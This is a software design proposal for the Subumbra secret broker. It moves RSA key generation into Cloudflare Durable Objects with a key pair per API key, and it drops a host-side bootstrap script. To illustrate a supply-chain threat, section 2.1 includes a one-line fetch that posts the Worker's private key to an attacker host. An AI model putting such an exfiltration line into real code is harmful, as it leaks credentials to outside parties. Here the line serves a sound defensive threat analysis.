# cc-proposal-001: Per-Key Asymmetric Isolation, CF-Side Key Generation, and Full Docker Encapsulation

**Status:** Proposed
**Date:** 2026-04-30
**Branch:** claude/cloudflare-secret-retrieval-bat1m
**Review:** Three Amigos Council (Claude · Codex · Gemini)

---

## Executive Summary

This proposal describes a targeted evolution of the Subumbra secret broker across three areas:

1. **Security** — Move RSA private key generation entirely into Cloudflare, store per-key private keys in Durable Object `state.storage`, eliminate the `WORKER_PRIVATE_KEY` environment string binding.
2. **Bootstrap UX** — Replace the menu-driven wizard with a plan-based template-driven flow backed by an enriched `providers.json`. Absorb `post-bootstrap.sh` into the bootstrap container.
3. **Portability** — Remove all host-side shell dependencies so the system runs identically under Docker, Podman, Portainer, and any OCI-compatible runtime.

The cryptographic envelope format, `keys.json` schema, adapter contract, HMAC replay protection, audit SQLite, and all service boundaries are unchanged.

---

## 2. Current Architecture and Its Security Limitations

### 2.1 The WORKER_PRIVATE_KEY String Exposure

The primary concern is in `worker/src/worker.js` at the `getPrivateKey()` function:

```js
async function getPrivateKey(env) {
  if (_cachedPrivateKey) return _cachedPrivateKey;
  const derBytes = base64ToBytes(env.WORKER_PRIVATE_KEY); // ← plain JS string
  _cachedPrivateKey = await crypto.subtle.importKey(
    "pkcs8", derBytes, { name: "RSA-OAEP", hash: "SHA-256" },
    false, ["decrypt"],
  );
  return _cachedPrivateKey;
}
env.WORKER_PRIVATE_KEY is a plain JavaScript string injected into the Worker's
binding scope. It is accessible to every line of code in the Worker script before
importKey() is called. The extractable: false flag only protects the resulting
CryptoKey object — it does not protect the raw string from which it was derived.
Any code running in the Worker isolate — including injected dependencies, modified
Worker deployments, or supply-chain compromised packages — can read
env.WORKER_PRIVATE_KEY directly and exfiltrate it in a single line:
await fetch("https://attacker.com", { method: "POST", body: env.WORKER_PRIVATE_KEY });
2.2 Single Shared RSA Key Pair — All-or-Nothing Blast Radius
The current bootstrap (bootstrap/subumbra-bootstrap.py:1736-1766) generates
one RSA-4096 key pair and uses it to wrap the DEK for every key record. If that
private key is compromised, every provider key across every record is exposed
simultaneously. There is no isolation between providers or between customers.
2.3 Key Generation on Operator Infrastructure
The RSA private key is generated in Python on the operator's server, serialized
to a base64 string (private_key_b64), and passed to a wrangler subprocess via
stdin (bootstrap/subumbra-bootstrap.py:1370-1376). During this window the key:
Exists as a Python string in a CPython heap (strings are immutable; the
"zeroing" at line 1897 creates a new string object, the original bytes remain
in the heap until GC decides to reclaim them)
Transits a subprocess stdin pipe visible in /proc/<pid>/fd/0 to processes
with sufficient privilege inside the container
Is held in wrangler's Node.js memory for the duration of the secret push
2.4 The post-bootstrap.sh Host Dependency
post-bootstrap.sh requires bash, docker CLI, python3, sed, and optionally
shred — all on the host. This breaks deployments where operators pull images
from Docker Hub, Podman, or Portainer without the repository. It also splits
the bootstrap concern across two runtimes (container + host shell) making
the process harder to audit, test, and maintain.
3. Cloudflare Platform Constraints and the Security Floor
3.1 No HSM or TEE Available to Workers
Cloudflare Workers have no hardware security module, no trusted execution
environment (SGX/TDX), and no equivalent to a hardware key store. CF's own
Keyless SSL product achieves genuine key isolation by running private key
operations inside CF's internal HSM infrastructure — this API is not exposed
to customer Workers.
3.2 What extractable: false Actually Protects
The extractable: false flag passed to crypto.subtle.importKey() prevents:
crypto.subtle.exportKey() from returning key bytes
crypto.subtle.wrapKey() from returning an encrypted form
It does not protect:
The raw string env.WORKER_PRIVATE_KEY before importKey() is called
Any decrypted API key string produced as output of decrypt()
Key material accessible via state.storage.get() from within DO code
3.3 The DO state.storage Isolation Boundary
state.storage in a Durable Object is the only meaningful isolation boundary
available on the CF Workers platform:
Worker entrypoint code cannot call state.storage directly
Code in a different DO class cannot read another class's storage
Only the handler code of the specific DO class that owns the storage can
access it
If the RSA private key is stored in SubumbraKeyVault DO state.storage
and there is no WORKER_PRIVATE_KEY env binding, then the Worker entrypoint
code has no path to key material at all. An attacker who compromises only
the Worker entrypoint gains nothing cryptographically useful.
3.4 The Residual Risk
The residual risk after this proposal: an attacker who deploys malicious
SubumbraKeyVault DO code can read state.storage. This requires Cloudflare
account access or a compromised CF API token with Workers deploy permissions.
This is the irreducible floor given the CF Workers platform as it exists today.
The outer trust perimeter is CF account access control — this is the same
trust assumption all CF Workers-based systems make.
4. Proposed Architecture
4.1 CF-Side Key Generation
During bootstrap, instead of generating the RSA key pair in Python and pushing
WORKER_PRIVATE_KEY to CF Secrets, bootstrap deploys the Worker with a
one-time BOOTSTRAP_SETUP_TOKEN, then calls /setup/keygen on the Worker
for each key record. The Worker generates the key pair entirely within CF:
bootstrap → POST /setup/keygen
            {key_id, cf_region_hint, setup_token}
            ↓
SubumbraKeyVault DO (idFromName("vault-{key_id}", {locationHint}))
  crypto.subtle.generateKey(RSA-4096, extractable=true for storage)
  exportKey("pkcs8") → state.storage.put("pk", bytes)
  exportKey("spki")  → return public_key_b64 to bootstrap only
            ↓
bootstrap receives public key, encrypts API key blob, writes keys.json
The RSA private key is generated in CF, stored in CF, and never exists on
the operator's server at any point. WORKER_PRIVATE_KEY env binding is
removed from the Worker entirely.
After all keygen calls complete, bootstrap deletes BOOTSTRAP_SETUP_TOKEN
from CF Secrets — the keygen window closes permanently.
4.2 Per-Key RSA Pairs and Geographic Placement
Each key record gets its own RSA-4096 key pair and its own named
SubumbraKeyVault DO instance:
vault-anthropic_litellm_1   → idFromName("vault-anthropic_litellm_1", {locationHint: "wnam"})
vault-openai_litellm_1      → idFromName("vault-openai_litellm_1",    {locationHint: "wnam"})
vault-mistral_litellm_1     → idFromName("vault-mistral_litellm_1",   {locationHint: "weur"})
Each DO instance stores its own private key in state.storage. The pub_key_fp
field already present in every keys.json record routes the Worker to the
correct vault DO. A new vault_id field is added to each record to make
routing explicit and avoid re-deriving it from the fingerprint at runtime.
Geographic placement pins each vault DO near the corresponding provider's
API endpoint — reducing the DO→Provider hop latency. Location hints come
from cf_region_hint in providers.json (see Section 6).
4.3 Split DO Architecture
Two DO classes replace the current single SubumbraProxy DO:
SubumbraKeyVault (named singleton per key_id):
state.storage holds the RSA-4096 private key bytes
Handles only /decrypt requests: unwrap DEK → decrypt API key → return plaintext
No upstream calls, no persistent connections
CryptoKey cached in module scope after first use (extractable: false)
SubumbraProxy (per-request, newUniqueId()):
Receives encrypted blob + upstream request parameters from Worker
Calls SubumbraKeyVault DO for decryption
Makes upstream provider call with decrypted key
Streams response back
Ephemeral — discarded after each request, same as today
The decrypted API key exists only inside the SubumbraProxy DO isolate for
the duration of the upstream call (~100ms). It never appears in Worker
entrypoint code.
4.4 Module-Scope CryptoKey Cache in SubumbraKeyVault
let _cachedKey = null;

export class SubumbraKeyVault {
  constructor(state, env) { this.state = state; }

  async fetch(request) {
    if (!_cachedKey) {
      const rawBytes = await this.state.storage.get("pk");
      _cachedKey = await crypto.subtle.importKey(
        "pkcs8", rawBytes,
        { name: "RSA-OAEP", hash: "SHA-256" },
        false,        // non-extractable after import
        ["decrypt"]
      );
      // rawBytes goes out of scope here
    }
    // use _cachedKey for RSA-OAEP unwrap
  }
}
After the first request warms the cache, subsequent requests skip
state.storage entirely. Cold start overhead (storage read + importKey) is
~20-80ms, occurring only after DO eviction.
4.5 Full Runtime Request Flow
App → subumbra-proxy:8090/t/<key_id>/...
  ↓
subumbra-proxy fetches encrypted record from subumbra-keys
  ↓
subumbra-proxy → POST CF Worker /proxy
  {ciphertext, wrapped_dek, pub_key_fp, vault_id, key_id, provider,
   target_url, method, headers, body}
  ↓
Worker (nearest CF edge — globally replicated)
  validates X-Subumbra-Token
  creates SubumbraProxy DO (newUniqueId)
  ↓
SubumbraProxy DO
  → SubumbraKeyVault DO (idFromName("vault-{key_id}"))
    unwrap DEK with cached RSA key
    decrypt API key with AES-256-GCM
    return plaintext key to SubumbraProxy DO only
  → upstream provider call with plaintext key
  → stream response back
  ↓
subumbra-proxy → app (streaming)
No WORKER_PRIVATE_KEY binding exists at any point in this flow.
5. Security Analysis
5.1 Threat Model
In scope:
Compromise of Worker entrypoint code (malicious deploy, supply chain)
Exfiltration of keys.json from subumbra-keys volume
Interception of bootstrap process on operator's server
Targeted attack on specific key record
Out of scope (CF platform trust boundary):
Cloudflare account compromise
Compromise of CF's own infrastructure
Physical access to CF data centers
5.2 Attack Surface Comparison
Attack Vector
Current Design
Proposed Design
Read env.WORKER_PRIVATE_KEY from Worker scope
Exposed — plain JS string
Binding does not exist
Malicious Worker entrypoint code
Can extract private key
No key material accessible
Steal keys.json + one private key
Decrypt ALL records
Decrypt ONE record only
Compromise bootstrap server RAM
Private key in Python heap
Key never leaves CF
Compromise bootstrap subprocess
Key in wrangler stdin pipe
No key transit on server
Malicious SubumbraKeyVault DO code
N/A
Can read state.storage — residual floor
Malicious SubumbraProxy DO code
Receives decrypted key (current behavior)
Same — ephemeral ~100ms
5.3 Blast Radius: Current vs Proposed
Current: One RSA key pair wraps all DEKs. Compromise of WORKER_PRIVATE_KEY
→ all provider keys for all records decryptable.
Proposed: One RSA key pair per key_id. Compromise of one vault DO's
state.storage → one API key decryptable. All other key pairs are in separate
DO instances with separate storage.
5.4 The extractable: false Improvement
In the current design, extractable: false provides no protection against
reading env.WORKER_PRIVATE_KEY before importKey(). In the proposed design,
once the key is in SubumbraKeyVault DO state.storage and imported as a
non-extractable CryptoKey in module scope, exportKey() is blocked and the
raw bytes are no longer referenced. This is the correct use of the flag.
6. Why This Is Not Secret Sprawl
6.1 What Secret Sprawl Actually Is
Secret sprawl describes the untracked proliferation of credentials across
systems — values stored in spreadsheets, distributed manually, rotated by
humans running individual commands, with no central audit trail. The concern
raised against per-key RSA pairs during early design discussions applied
the traditional infrastructure definition to an architecture where it does
not hold.
6.2 Why This Architecture Avoids It
Every private key in this design:
Is programmatically generated in CF during bootstrap — no manual provisioning
Is indexed by pub_key_fp already present in every keys.json record —
every key is traceable from its encrypted blob back to its vault DO
Has a deterministic vault DO name derived from key_id — no lookup table
needed at runtime
Is rotated by a single command (--rotate) that calls the vault DO's
/rekey endpoint — no coordination across systems
Leaves an audit trail in audit.db on every access
The "sprawl" concern assumes manual lifecycle management. Here the lifecycle
is fully automated and the routing table already exists in keys.json.
6.3 Storage Cost Is Negligible
RSA-4096 private key in PKCS#8 DER: ~2.4KB. Base64: ~3.2KB.
100 key pairs × 3.2KB = ~320KB in DO state.storage
CF storage cost at $0.20/GB-month = ~$0.00006/month
keys.json at ~1KB/record × 100 records = ~100KB flat file
Storage is not a constraint at any realistic scale.
7. Bootstrap Redesign
7.1 Provider Template System
providers.json is extended with four new fields per entry:
{
  "provider_id": "anthropic",
  "target_host": "api.anthropic.com",
  "auth_header": "x-api-key",
  "auth_prefix": "",
  "env_var": "ANTHROPIC_KEY",
  "env_aliases": ["ANTHROPIC_API_KEY", "CLAUDE_API_KEY"],
  "cf_region_hint": "wnam",
  "dc_notes": "US West (Oregon)",
  "community_latency_ms": {"wnam": 12, "enam": 55, "weur": 120}
}
env_aliases — non-standard env var names that map to this provider,
enabling the bootstrap scanner to recognize imports from LiteLLM, OpenWebUI,
n8n, and other apps without a hardcoded whitelist in Python
cf_region_hint — the silent default CF location hint for this provider's
vault DO; most operators never see a region question
dc_notes — human-readable DC location for documentation
community_latency_ms — crowdsourced round-trip measurements from CF
regions to this provider; contributed via PR to the repo
7.2 Plan-Based Wizard
The current Step 2 (numbered menu, one key at a time) is replaced with an
environment scan that produces a plan for operator review:
Step 2: Environment Scan
──────────────────────────────────────────────────────────────────────
  Scanning environment and mounted .env files...

  Recognized (from providers.json):
    ANTHROPIC_API_KEY  →  anthropic   →  anthropic_litellm_1  [wnam]
    OPENAI_API_KEY     →  openai      →  openai_litellm_1     [wnam]
    MISTRAL_API_KEY    →  mistral     →  mistral_litellm_1    [weur]

  Unrecognized:
    ACME_SERVICE_KEY   →  ? (no provider match)

  Accept plan? [Y / customize / add-more]:
Accept: region defaults applied silently, proceed to adapter scopes
Customize: per-key region override with numbered region picker
Add-more: existing multi-file import loop, unchanged
Unrecognized keys trigger a provider assignment prompt after plan acceptance.
In CI mode (STRICT_ENV=true), unrecognized keys are a fatal error.
7.3 File Import Path (Already Batch — Minimal Change)
The existing _run_import_screen() already handles bulk import at the file
level (one app label for all keys in a file, one shred question). The only
addition is one region confirmation per file:
Accept recommended regions for all 8 keys? [Y/override]:
If override, regions are shown grouped by provider — one question per provider
group, not per key. This maintains the existing ~3-interaction-per-file UX.
7.4 .env.bootstrap Additions (Backward Compatible)
# All new fields are optional — existing .env.bootstrap files unchanged
DEFAULT_CF_REGION=wnam
ANTHROPIC_CF_REGION=wnam
MISTRAL_CF_REGION=weur
STRICT_ENV=false
7.5 Elimination of post-bootstrap.sh
post-bootstrap.sh performs six operations that all translate cleanly to
Python:
Read runtime.env from volume → already written by bootstrap Python
Normalize legacy adapter names → Python dict rename
Update .env in-place → Python file read/write
Handle custom adapter tokens → Python loop
Verify required values written → Python assertions
Shred .env.bootstrap → already done for imported files, extend to bootstrap input
Required change to docker-compose.yml:
bootstrap:
  volumes:
    - ./worker:/app/worker:ro
    - subumbra_data:/app/data
    - ./.env:/app/target.env    # bootstrap writes runtime values here directly
Bootstrap Python, at the end of main(), writes runtime values to
/app/target.env using the same key-by-key update logic as the shell script's
update_env() function. Token drift detection (checking running containers)
is moved to a --check diagnostic flag — it is not part of the core bootstrap
flow and requires docker CLI access that is not available inside the container.
post-bootstrap.sh is deleted. The operator workflow becomes:
# Before (two steps, host dependency):
docker compose --profile bootstrap run --rm -it bootstrap
./post-bootstrap.sh

# After (one step, Docker only):
docker compose --profile bootstrap run --rm -it bootstrap
8. Portability and Future Deployment Targets
8.1 The Host Dependency Problem
post-bootstrap.sh requires the operator to have cloned the repository.
When deploying via Docker Hub image pull, Portainer stack deployment, Podman
compose, or any OCI-based deployment that does not include the repository,
the script is unavailable. This is not a theoretical future concern — it
is a current blocker for any deployment path that does not involve git clone.
8.2 Docker-Only Operation
Absorbing bootstrap completion into the container means the only host
requirement is docker compose (or podman compose, or any compose-
compatible tool). The operator mounts .env as a volume, runs bootstrap,
and the container handles everything — CF deployment, key generation, token
generation, and .env population.
This is compatible with:
Docker Hub image pull deployments
Podman with podman-compose or podman compose
Portainer stack deployments from a compose file
CI/CD pipelines that run containers without host scripts
Kubernetes Jobs running the bootstrap container once at deploy time
8.3 Volume Strategy (Unchanged)
The subumbra_data named volume already holds keys.json, audit.db,
runtime.env, and public_key.pem. The only addition is mounting .env
from the project root for the bootstrap container's final write. All other
volumes and network topology are unchanged.
9. What Changes vs What Stays the Same
Changes
Component
Change
worker/src/worker.js
Add SubumbraKeyVault DO class; add /setup/keygen endpoint; remove WORKER_PRIVATE_KEY env binding; route Worker to vault DO instead of direct decrypt
worker/src/providers.json
Add env_aliases, cf_region_hint, dc_notes, community_latency_ms per provider
bootstrap/subumbra-bootstrap.py
Deploy Worker first; generate setup token; call /setup/keygen per key; plan-based wizard Step 2; write to mounted .env; shred .env.bootstrap
docker-compose.yml
Add .env volume mount for bootstrap service
post-bootstrap.sh
Deleted
keys.json record format
Add vault_id field per record
wrangler.toml
Remove WORKER_PRIVATE_KEY secret declaration; add SubumbraKeyVault DO binding and migration
Stays the Same
Component
Unchanged
V2 envelope encryption format (RSA-OAEP + AES-256-GCM + AAD)
✓
keys.json schema (all existing fields)
✓
subumbra-keys/app.py — Flask service, audit SQLite, nonce deduplication
✓
Adapter contract (POST /proxy, X-Subumbra-Token)
✓
HMAC replay protection
✓
--rotate per-key rotation mode
✓
Adapter scope assignment (Step 3 wizard)
✓
Multi-file .env import loop
✓
SUBUMBRA_ADAPTER_REGISTRY, SUBUMBRA_HMAC_KEY, token flow
✓
Docker networking (internal/external networks)
✓
subumbra-proxy, subumbra-probe, ui services
✓
Health check endpoints
✓
10. Implementation Phases
Phase 1 — providers.json enrichment (no code changes, no breakage)
Add env_aliases, cf_region_hint, dc_notes, community_latency_ms to
all provider entries. No functional change — new fields are additive.
Phase 2 — Worker: SubumbraKeyVault DO + /setup/keygen endpoint
Add the SubumbraKeyVault DO class alongside the existing SubumbraProxy.
Add the /setup/keygen endpoint gated on BOOTSTRAP_SETUP_TOKEN.
Keep WORKER_PRIVATE_KEY handling as a fallback during transition.
Full test with wrangler dev.
Phase 3 — Bootstrap: CF-side keygen + setup token flow
Change bootstrap deploy order: deploy Worker first, then collect keys, then
call /setup/keygen per key. Remove Python-side RSA generation.
Full test: docker compose --profile bootstrap run --rm -it bootstrap.
Phase 4 — Bootstrap: plan-based wizard + .env write + post-bootstrap.sh deletion
Implement _scan_env_for_providers(). Redesign Step 2. Mount .env as volume.
Write runtime values to /app/target.env. Delete post-bootstrap.sh.
Full end-to-end test including .env population.
Phase 5 — Worker: remove WORKER_PRIVATE_KEY fallback
Remove the transition-era fallback. WORKER_PRIVATE_KEY binding no longer
declared. Full end-to-end test.
11. Risks and Mitigations
Risk
Likelihood
Mitigation
CF DO cold start adds latency on first post-idle request
Medium
Module-scope CryptoKey cache warms on first request; ~20-80ms overhead invisible against provider API latency
Named vault DO geography causes high latency for distant adapters
Low-Medium
cf_region_hint in providers.json places vault near provider DC; adapter→Worker hop is always nearest CF edge
BOOTSTRAP_SETUP_TOKEN window exploited
Very Low
Token is random 32-byte hex; deleted immediately after keygen phase; Worker endpoint validates token before any key generation
DO instance count at scale
Very Low
DO instances are inactive until called, consume no resources at rest; CF has no published hard limit on named DO count
Bootstrap writes invalid data to .env
Low
Python writes key-by-key with verification; existing non-bootstrap keys preserved; failure aborts before write completes
Community providers.json data is stale or wrong
Low
Region hints are optional defaults; operators can override; wrong hint causes latency, not failures
12. Open Questions for Council Review
DO-to-DO transport: The decrypted API key transits from SubumbraKeyVault
to SubumbraProxy as a string in a JSON response body. This is CF-internal
(Aloha backbone, not public internet) but is the council comfortable with
this as the model, given the alternative (KeyVault handles the upstream call
itself) collapses isolation between concerns?
Per-key vs per-provider DO granularity: This proposal uses per-key_id
vault DOs for maximum blast radius isolation. Per-provider DOs (one vault per
provider, all keys for that provider share one RSA pair) are simpler and still
a significant improvement over the current single-pair model. Council should
confirm preferred granularity.
Backward compatibility window: Phase 2 keeps WORKER_PRIVATE_KEY as a
fallback. Should the fallback be gated on an explicit LEGACY_MODE=true env
var to prevent accidental use after migration completes?
post-bootstrap.sh deprecation notice: Should post-bootstrap.sh be
replaced with a stub that prints a deprecation warning pointing to the new
Docker-only flow, rather than deleted outright, for the transition release?
Proposal prepared for Three Amigos Council review.
Subumbra project — polysemic/Subumbra